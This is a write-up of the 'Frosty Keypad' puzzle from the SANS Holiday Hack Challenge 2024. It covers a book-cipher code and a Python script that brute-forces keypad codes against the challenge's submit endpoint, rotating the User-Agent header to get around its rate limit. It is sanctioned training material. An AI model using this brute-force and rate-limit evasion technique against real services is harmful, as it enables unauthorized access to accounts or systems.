+++
author = "Maik de Kruif"
title = "Frosty Keypad"
subtitle = "Act 1 - SANS Holiday Hack Challenge 2024"
date = 2024-11-24T18:23:54+01:00
description = "In the fourth challenge of the Holiday Hack Challenge 2024, we'll explore how to use curl using the Linux manpages."
cover = "img/writeups/holiday-hack-challenge/2024/act1/frosty-keypad/cover.png"
tags = [
    "Holiday Hack Challenge",
    "ctf",
    "hacking",
    "writeup",
]
categories = [
    "ctf",
    "writeups",
    "hacking",
]
+++

## Link

If you want to play the challenge yourself, you can find it here:

<https://2024.holidayhackchallenge.com/>

## Story line

Let's start off by talking to Morcel Nougat:

```txt
Hello again! I'm Morcel Nougat, dashing around like a reindeer on a sugar rush! We've got a bit of a dilemma, and I could really use your expertise.

Wombley and Alabaster have taken charge now that Santa’s gone missing, and We're scrambling to get the Wish List secured. But... one of the elves in the Data Management Team got overzealous, and the Shredder McShreddin 9000 gobbled up a crucial document we need to access Santa's chest!

It’s our golden ticket to getting Santa’s Little Helper tool working properly. Without it, the hardware hack we're planning is as empty as Santa’s sleigh in January.

Think you can help? I can get you into the Shredder McShreddin 9000’s inner workings to retrieve the pieces, but there are two access codes involved. One of the elves left a hint, but it’s all a blur to me!

I've noticed that some elves keep referring to a certain book when they walk by. I bet it has the answers we need to crack the code and recover the document!

You know, some of the elves always have their noses in the same book when they pass by here. Maybe it’s got the clues we need to crack the code?
```

## Recon

After clicking on the challenge, we'll get to see a keypad. There also seems to be a note attached.

{{< figure src="/img/writeups/holiday-hack-challenge/2024/act1/frosty-keypad/keypad.png" title="Keypad" >}}

From clicking around on the numbers, the code seems to have at most five digits. Let's zoom in further on that note by clicking on it.

{{< figure class="small" src="/img/writeups/holiday-hack-challenge/2024/act1/frosty-keypad/note.png" title="Attached note" >}}

The note contains five digit combinations.

From talking to the elf, we can assume the combinations refer to a location in the book that was referenced. The elf said that elves have their noses in the book when they pass by, so let's also walk around a little so see if we can find anything.

{{< figure src="/img/writeups/holiday-hack-challenge/2024/act1/frosty-keypad/book-location.png" title="Location of the book" >}}

After walking around for a bit, I found the book under the box of snowballs!

We can open the book navigation to the settings by clicking any of the buttons on the left of the screen, and going to "Items". From there we can click the url to read the book.

{{< figure class="small inline" src="/img/writeups/holiday-hack-challenge/2024/act1/frosty-keypad/settings-book.png" title="Items in settings" >}}
{{< figure class="small inline" src="/img/writeups/holiday-hack-challenge/2024/act1/frosty-keypad/book.png" title="First pages of the book" >}}

## Silver

We've had a pattern with every game so far that we can solve silver without reading any code, so we can probably do it here as well.

Let's start with the note. At first I thought the numbers would refer to `page:line:word`, but that doesn't work since no page has 19 lines. Instead, the pattern likely means `page:word:letter`. Let's try it out, and create a mapping.

| Location | Result |
| -------- | ------ |
| `2:6:1`  | S      |
| `4:19:3` | A      |
| `6:1:1`  | N      |
| `3:10:4` | T      |
| `14:8:3` | A      |

Okay, so we have some letters now. Unfortunately, we don't need letters, we need digits.

Back in the good ol' times we had [telephone keypads](https://en.wikipedia.org/wiki/Telephone_keypad) where you would write letters by pressing some digits a certain amount of times. Here's an example of what they looked like:

{{< figure class="small" src="/img/writeups/holiday-hack-challenge/2024/act1/frosty-keypad/telephone-keypad.png" title="Telephone keypad" attr="Sakurambo (public domain)" >}}

As Santa is quite old already, he may have used this type of encoding to remember the code. If we were to convert our letters to digits, we would get the following sequence: `7777 2 66 8 2`. Since that is too long, we can try only the first digit of the letter like so: `72682`.

{{< figure class="small" src="/img/writeups/holiday-hack-challenge/2024/act1/frosty-keypad/silver.png" title="Success message for silver" >}}

Woohoo! We got the medal.

## Gold

### Continued story line

Let's first talk to the elf again, he'll tell us what we'll have to do for gold.

```txt
WOW, you did it! You know, they say Ottendorf ciphers were used back in the Frosty Archives crisis… or was that during the Jack Frost incident? Either way, you're amazing!

But wait—there’s still one more code tucked away! This one might need a bit more elbow grease… you may need to try a few combinations to crack it!
```

We also received a new item, but from reading the text we probably only need it for the hardware hacking challenge.

{{< figure class="small" src="/img/writeups/holiday-hack-challenge/2024/act1/frosty-keypad/shreds-item.png" title="New item" >}}

### Exploration

Let's get to solving the gold challenge. If we open the DevTools, and look at the source of the iframe, we'll find some stuff related to a flashlight.

```js
// Create flashlight icon
uvLight = this.add.sprite(150, 250, "uv_light");
// ...
uvLight.setVisible(false);

flashlight().then((result) => {
    if (result) {
        console.log("Flashlight is enabled");
        uvLight.setVisible(true);
    } else {
        console.log("Flashlight is disabled");
    }
    // ...
});
```

It seems like there is some flashlight functionality which is disabled by default. The `flashlight()` function sends out a request to check if it has been found, but since I hadn't yet, we can enable it manually by setting the uvLight visibility.

Before we can do so, we'll have to attach the DevTools to the iframe again just like in a previous challenge:

{{< figure src="/img/writeups/holiday-hack-challenge/2024/act1/frosty-keypad/attach-devtools.png" title="Attaching DevTools to the iframe" >}}

From there we can simply enable it manually using the following line:

```js
uvLight.setVisible(true);
```

Now a flashlight shows up. If we click and drag it, it shows fingerprints on some keys. This suggest that only those keys are used, and they correspond with the code we got in the silver challenge.

{{< figure class="small" src="/img/writeups/holiday-hack-challenge/2024/act1/frosty-keypad/using-flashlight.png" title="Using the flashlight" >}}

These digits can also be found if we follow the code of the flashlight. It's in the function that checks which keys are overlapped by the light.

```js
function checkOverlap() {
    clearOverlays();
    const keysToCheck = ["2", "7", "6", "8", "Enter"];

    // ...
}
```

I later found out we could've gotten the flashlight by just looking around a bit more, it was an item right above the challenge.

{{< figure class="small" src="/img/writeups/holiday-hack-challenge/2024/act1/frosty-keypad/flashlight-location.png" title="Location of the flashlight" >}}

Anyway, back to the task at hand. Looking further through the code, it doesn't seem like we'll be able to get any other hints from there. The elf said something about trying a few combinations to crack it. Maybe we'll need to brute force our way into the safe.

### Solving

It isn't feasible to send all combinations manually, as we would have to manually enter (four to the power of five) 1024 combinations. I'm lazy, and I'm not going to sit here manually sending them, so let's code our way to the solution.

First, we'll have to check out how the code is sent to the server for validation. In the javascript code, this is done in the `submitAction` function.

```js
 async function submitAction(answer, callback) {
    const urlParams = new URLSearchParams(window.location.search);
    const id = urlParams.get('id');
    const url = `/submit?id=${id}`;
    const data = { answer: answer }; // Send the answer as a JSON object

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });
        // ...
    }
    // ...
}
```

This code uses the built-in `fetch` function to send a POST request to `/submit?id=[ID HERE]`, with a body of `{"answer: "12345"}`. We can also verify this by going to the Network tab in the DevTools.

{{< figure class="small" src="/img/writeups/holiday-hack-challenge/2024/act1/frosty-keypad/devtools-network.png" title="Request in DevTools" >}}

Now wel'll have to write some code to submit these requests with all possible combinations. My preferred programming language for short scripts like this is Python, but it can just as easily be done using javascript in the browser.

In Python, we can make use of the `requests` library to send http requests, and `itertools` for generating all possible answers. They are both built-in to python, so no need to install anything. Using these libraries, I quickly sketched up the following script. `[YOUR ID HERE]` should be replace with your id. You can copy it from the Network tab in the DevTools.

```py
from itertools import product
import requests

keys = ["2", "7", "6", "8"]

for answer in product(keys, repeat=5):
    answer = "".join(answer)

    res = requests.post(
        "https://hhc24-frostykeypad.holidayhackchallenge.com/submit?id=[YOUR ID HERE]",
        json={"answer": answer},
    )

    print(answer, res.status_code, res.json())

    # If the answer is accepted, we likely won't get a 400 response.
    if res.status_code != 400:
        break
```

```txt
22222 400 {'error': "The data you've provided seems to have gone on a whimsical adventure, losing all sense of order and coherence!"}
22227 400 {'error': "The data you've provided seems to have gone on a whimsical adventure, losing all sense of order and coherence!"}
22226 429 {'error': 'Too many requests from this User-Agent. Limited to 1 requests per 1 seconds.'}
```

This didn't work very well however. It seems there is a rate limit in place of one request per second. While we could just add a delay of one second using the `sleep` function (1024/60 is about 17 minutes), the error is rather weird; it specifically specifies it's limited for the User-Agent.

When sending a request, the browser automatically adds a user agent to every request using the `User-Agent:` header. This header contains information about what is sending the request. In the case of Chrome, it will contain that it's Chrome and which specific version of it is running.

To circumvent this limit, we can try modifying the User-Agent on every request. This way, we should never hit a limit. To do this, we can set the User-Agent to something that includes the answer. This will make sure we can never send the same User-Agent twice. I made the following change:

```diff
         json={"answer": answer},
+        headers={
+            "User-Agent": f"somerandomstring{answer}",
+        },
     )
```

Which results in the following complete script:

```py
from itertools import product
import requests

keys = ["2", "7", "6", "8"]

for answer in product(keys, repeat=5):
    answer = "".join(answer)

    res = requests.post(
        "https://hhc24-frostykeypad.holidayhackchallenge.com/submit?id=0e338764-a6fc-47f5-ae8b-88cb1d477e4d",
        json={"answer": answer},
        headers={
            "User-Agent": f"somerandomstring{answer}",
        },
    )

    print(answer, res.status_code, res.json())

    # If the answer is accepted, we likely won't get a 400 response
    if res.status_code != 400:
        break
```

I ran the script, and, after 30 tries, it got the answer: `22786`.

We did get lucky here, as we could have also encountered the answer for silver first (which would also not return a 400 result). If this would have been the case, we could just change the if statement to also check if the answer is not equal to the silver one like so:

```diff
     # If the answer is accepted, we likely won't get a 400 response
-    if res.status_code != 400:
+    if res.status_code != 400 and answer != "72682":
         break
```

That's it for this challenge, see you in the next one!
